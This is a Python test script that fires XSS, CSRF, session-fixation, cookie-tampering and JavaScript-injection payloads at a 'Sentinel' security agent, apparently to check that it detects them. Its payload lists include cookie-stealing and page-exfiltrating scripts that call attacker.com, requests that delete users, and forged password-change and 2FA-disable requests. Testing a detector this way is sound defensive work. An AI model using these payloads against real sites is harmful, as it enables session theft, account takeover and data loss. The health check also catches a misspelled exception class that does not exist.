#!/usr/bin/env python3
"""
Client-Side Attack Testing Script for Sentinel Agent
Tests XSS, CSRF, DOM-based, and session-based attacks

Client-side attacks target the user's browser and client-side code, unlike server-side attacks
which target backend systems. This includes:
- XSS (Cross-Site Scripting)
- CSRF (Cross-Site Request Forgery)
- DOM manipulation/hijacking
- Session fixation
- Cookie theft/manipulation
- Malicious redirects

Usage:
    python3 test_client_attacks.py
    python3 test_client_attacks.py --target http://10.76.250.89:8000
    
Requirements:
    pip install requests
"""

import os
import requests
import time
import sys
import json
from urllib.parse import urljoin, quote
from typing import Dict, List, Tuple

# Configuration
TARGET = os.getenv("SENTINEL_TEST_TARGET", "http://10.76.250.89:8000")
DELAY_BETWEEN_ATTACKS = 1  # seconds
VERBOSE = os.getenv("VERBOSE", "0") == "1"

# ============================================================================
# CLIENT-SIDE ATTACK PAYLOADS
# ============================================================================

# Stored XSS payloads (persist in database, execute when page loads)
STORED_XSS = [
    "<script>alert('Stored XSS');</script>",
    "<img src=x onerror=\"alert('XSS via onerror')\">",
    "<svg/onload=\"fetch('http://attacker.com/steal'); alert('XSS')\">",
    "<body onload=\"fetch('/api/user', {method: 'DELETE'})\">",
    "<input autofocus onfocus=\"fetch('/api/admin/remove', {method: 'POST', body: 'user=me'})\">",
    "<marquee onstart=\"document.location='http://attacker.com/phishing'\">",
]

# Reflected XSS payloads (immediate execution via URL parameters)
REFLECTED_XSS = [
    "?\"><script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>",
    "?query=<script>new Image().src='http://attacker.com/steal?data='+btoa(document.body.innerHTML)</script>",
    "?redirect=javascript:alert('Reflected XSS')",
    "?id=<img src=x onerror=\"undefined((function(){fetch('http://attacker.com/?admin=true',{method:'POST'})})())\">",
]

# DOM-based XSS (unsafe DOM manipulation)
DOM_XSS = [
    "?name=<script>document.getElementById('user').innerHTML=atob('PHNjcmlwdD5hbGVydCgnRE9NICBYU1MnKTwvc2NyaXB0Pg==')</script>",
    "?filter=\\u003cscript\\u003ealert(String.fromCharCode(88,83,83))\\u003c/script\\u003e",
    "#search=<img src=x onerror=\"fetch('http://attacker.com/steal')\">",
]

# CSRF payloads (cross-site state changes)
CSRF_PAYLOADS = [
    {
        "method": "POST",
        "endpoint": "/api/user/change-password",
        "data": {"new_password": "attacker123!", "confirm": "attacker123!"},
        "description": "CSRF: Password change"
    },
    {
        "method": "POST",
        "endpoint": "/api/user/email",
        "data": {"email": "attacker@evil.com"},
        "description": "CSRF: Email change"
    },
    {
        "method": "POST",
        "endpoint": "/api/settings/disable-2fa",
        "data": {},
        "description": "CSRF: Disable 2FA"
    },
    {
        "method": "POST",
        "endpoint": "/api/profile/update",
        "data": {"bio": "<script>alert('Embedded XSS in profile')</script>"},
        "description": "CSRF + Stored XSS: Profile update"
    },
]

# Session hijacking attempts
SESSION_ATTACKS = [
    {
        "method": "GET",
        "endpoint": "/?session_id=attacker_session_123",
        "description": "Session hijacking: Fake session ID in URL"
    },
    {
        "method": "POST",
        "endpoint": "/api/login",
        "data": {"user_id": "admin", "force_session": "attacker_sid"},
        "description": "Session fixation: Force session parameter"
    },
]

# Cookie manipulation
COOKIE_ATTACKS = [
    {
        "method": "GET",
        "endpoint": "/",
        "cookies": {"admin": "true", "user_id": "999"},
        "description": "Cookie tampering: Impersonate admin"
    },
    {
        "method": "GET",
        "endpoint": "/api/user/profile",
        "cookies": {"role": "superadmin", "verified": "1"},
        "description": "Cookie tampering: Escalate privileges"
    },
]

# JavaScript execution payloads
JS_EXECUTION = [
    {
        "endpoint": "/?callback=<script>",
        "description": "JavaScript injection: Script tag in callback"
    },
    {
        "endpoint": "/?json={\"exec\":\"fetch('http://attacker.com')\"}",
        "description": "JSON injection: Code execution"
    },
    {
        "endpoint": "/?data=setTimeout(function(){fetch('http://attacker.com/steal')},500)",
        "description": "Delayed JavaScript execution"
    },
]

# ============================================================================
# UTILITIES
# ============================================================================

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_header(text):
    """Print formatted section header"""
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(70)}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

def print_test(text):
    """Print test description"""
    print(f"{Colors.CYAN}[*] {text}{Colors.ENDC}")

def print_success(text):
    """Print success message"""
    print(f"{Colors.GREEN}  [+] {text}{Colors.ENDC}")

def print_error(text):
    """Print error message"""
    print(f"{Colors.RED}  [-] {text}{Colors.ENDC}")

def print_warning(text):
    """Print warning message"""
    print(f"{Colors.YELLOW}  [!] {text}{Colors.ENDC}")

def print_info(text):
    """Print info message"""
    print(f"{Colors.BLUE}  [i] {text}{Colors.ENDC}")

def check_target_health():
    """Verify target is accessible before testing"""
    print_test("Checking target health...")
    try:
        response = requests.get(f"{TARGET}/", timeout=5)
        print_success(f"Target is accessible: {TARGET}")
        return True
    except requests.exceptions.ConnectError:
        print_error(f"Cannot connect to target: {TARGET}")
        print_warning("Make sure the Sentinel server is running")
        print_warning("Run: docker compose up -d (on Ubuntu server)")
        return False
    except Exception as e:
        print_error(f"Error checking target: {e}")
        return False

# ============================================================================
# CLIENT-SIDE ATTACK TESTS
# ============================================================================

def test_stored_xss():
    """Test Stored XSS (persistent XSS attacks)"""
    print_header("STORED XSS DETECTION")
    print_info("Stored XSS: Malicious script stored in database, executes for all users")
    print_info("Attack vectors: Comments, profiles, posts, user input fields\n")
    
    success_count = 0
    for i, payload in enumerate(STORED_XSS, 1):
        try:
            # Try to inject via comment/post endpoint
            url = f"{TARGET}/api/comments"
            data = {
                "comment": payload,
                "post_id": 1,
                "author": "attacker"
            }
            
            r = requests.post(url, json=data, timeout=5)
            
            if r.status_code in [200, 201, 400]:  # 400 if validation caught it
                print_success(f"Test {i}/{len(STORED_XSS)}: Payload sent → HTTP {r.status_code}")
                if VERBOSE and r.text:
                    print_info(f"Response: {r.text[:100]}")
                success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"Stored XSS tests completed: {success_count}/{len(STORED_XSS)} payloads sent")
    return True

def test_reflected_xss():
    """Test Reflected XSS (non-persistent, via URL)"""
    print_header("REFLECTED XSS DETECTION")
    print_info("Reflected XSS: Malicious script in URL, executes in victim's browser")
    print_info("Attack vectors: Search, filters, parameters\n")
    
    success_count = 0
    for i, payload in enumerate(REFLECTED_XSS, 1):
        try:
            url = f"{TARGET}/search{payload}"
            r = requests.get(url, timeout=5)
            
            print_success(f"Test {i}/{len(REFLECTED_XSS)}: Reflected XSS payload → HTTP {r.status_code}")
            if VERBOSE and "script" in r.text.lower():
                print_warning("  Script tag found in response (potential XSS vulnerability)")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"Reflected XSS tests completed: {success_count}/{len(REFLECTED_XSS)} payloads sent")
    return True

def test_dom_xss():
    """Test DOM-based XSS"""
    print_header("DOM-BASED XSS DETECTION")
    print_info("DOM XSS: Unsafe DOM manipulation on client-side (innerHTML, eval, etc.)")
    print_info("Attack vectors: Fragment identifiers (#), postMessage events\n")
    
    success_count = 0
    for i, payload in enumerate(DOM_XSS, 1):
        try:
            url = f"{TARGET}/{payload}"
            r = requests.get(url, timeout=5)
            
            print_success(f"Test {i}/{len(DOM_XSS)}: DOM XSS payload → HTTP {r.status_code}")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"DOM XSS tests completed: {success_count}/{len(DOM_XSS)} payloads sent")
    return True

def test_csrf():
    """Test CSRF (Cross-Site Request Forgery)"""
    print_header("CSRF ATTACK DETECTION")
    print_info("CSRF: Forge requests on behalf of authenticated user")
    print_info("Attack: Attacker tricks user into visiting malicious site that makes requests\n")
    
    success_count = 0
    for i, csrf_test in enumerate(CSRF_PAYLOADS, 1):
        try:
            url = f"{TARGET}{csrf_test['endpoint']}"
            
            if csrf_test['method'] == 'POST':
                r = requests.post(url, json=csrf_test['data'], timeout=5, 
                                headers={'Referer': 'http://evil.com'})
            else:
                r = requests.get(url, timeout=5, 
                               headers={'Referer': 'http://evil.com'})
            
            print_success(f"Test {i}/{len(CSRF_PAYLOADS)}: {csrf_test['description']} → HTTP {r.status_code}")
            if r.status_code in [200, 201]:
                print_warning("  Request was accepted (potential CSRF vulnerability)")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"CSRF tests completed: {success_count}/{len(CSRF_PAYLOADS)} tests sent")
    return True

def test_session_attacks():
    """Test Session Hijacking & Fixation"""
    print_header("SESSION ATTACK DETECTION")
    print_info("Session Hijacking: Steal/predict user session tokens")
    print_info("Session Fixation: Force user to use attacker-controlled session\n")
    
    success_count = 0
    for i, attack in enumerate(SESSION_ATTACKS, 1):
        try:
            url = f"{TARGET}{attack['endpoint']}"
            
            if attack['method'] == 'POST':
                r = requests.post(url, json=attack.get('data', {}), timeout=5)
            else:
                r = requests.get(url, timeout=5)
            
            print_success(f"Test {i}/{len(SESSION_ATTACKS)}: {attack['description']} → HTTP {r.status_code}")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"Session attack tests completed: {success_count}/{len(SESSION_ATTACKS)} tests sent")
    return True

def test_cookie_attacks():
    """Test Cookie Manipulation & Tampering"""
    print_header("COOKIE ATTACK DETECTION")
    print_info("Cookie Tampering: Modify cookie values (admin flags, user IDs, roles)")
    print_info("Cookie Theft: Steal session cookies via XSS or MITM\n")
    
    success_count = 0
    for i, attack in enumerate(COOKIE_ATTACKS, 1):
        try:
            url = f"{TARGET}{attack['endpoint']}"
            
            if attack['method'] == 'POST':
                r = requests.post(url, cookies=attack.get('cookies', {}), timeout=5)
            else:
                r = requests.get(url, cookies=attack.get('cookies', {}), timeout=5)
            
            print_success(f"Test {i}/{len(COOKIE_ATTACKS)}: {attack['description']} → HTTP {r.status_code}")
            if r.status_code == 200:
                print_warning("  Request succeeded with tampered cookies (potential vulnerability)")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"Cookie attack tests completed: {success_count}/{len(COOKIE_ATTACKS)} tests sent")
    return True

def test_javascript_execution():
    """Test Arbitrary JavaScript Execution"""
    print_header("JAVASCRIPT EXECUTION DETECTION")
    print_info("Arbitrary JS: Execute attacker-controlled JavaScript code")
    print_info("Attack vectors: Eval, Function constructor, setTimeout with string\n")
    
    success_count = 0
    for i, attack in enumerate(JS_EXECUTION, 1):
        try:
            url = f"{TARGET}{attack['endpoint']}"
            r = requests.get(url, timeout=5)
            
            print_success(f"Test {i}/{len(JS_EXECUTION)}: {attack['description']} → HTTP {r.status_code}")
            success_count += 1
        except requests.exceptions.ConnectionError:
            print_error("Connection failed")
            return False
        except Exception as e:
            print_warning(f"Test {i}: {str(e)[:60]}")
        
        time.sleep(DELAY_BETWEEN_ATTACKS)
    
    print_info(f"JavaScript execution tests completed: {success_count}/{len(JS_EXECUTION)} tests sent")
    return True

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Run all client-side attack tests"""
    print_header("CLIENT-SIDE ATTACK TEST SUITE")
    print(f"Target: {TARGET}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    if not check_target_health():
        return 1
    
    print()
    time.sleep(2)
    
    tests = [
        ("Stored XSS", test_stored_xss),
        ("Reflected XSS", test_reflected_xss),
        ("DOM XSS", test_dom_xss),
        ("CSRF", test_csrf),
        ("Session Attacks", test_session_attacks),
        ("Cookie Attacks", test_cookie_attacks),
        ("JavaScript Execution", test_javascript_execution),
    ]
    
    results = {}
    for test_name, test_func in tests:
        try:
            result = test_func()
            results[test_name] = "✓ PASSED" if result else "✗ FAILED"
            time.sleep(2)
        except Exception as e:
            print_error(f"Fatal error in {test_name}: {e}")
            results[test_name] = "✗ ERROR"
    
    # Summary
    print_header("TEST SUMMARY")
    for test_name, status in results.items():
        status_emoji = "✓" if "PASSED" in status else "✗"
        print(f"{status_emoji} {test_name:30} {status}")
    
    passed = sum(1 for s in results.values() if "PASSED" in s)
    total = len(results)
    print(f"\nTotal: {passed}/{total} test groups passed")
    
    return 0 if passed == total else 1

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print_warning("\n[!] Test suite interrupted by user")
        sys.exit(1)
    except Exception as e:
        print_error(f"Unexpected error: {e}")
        sys.exit(1)
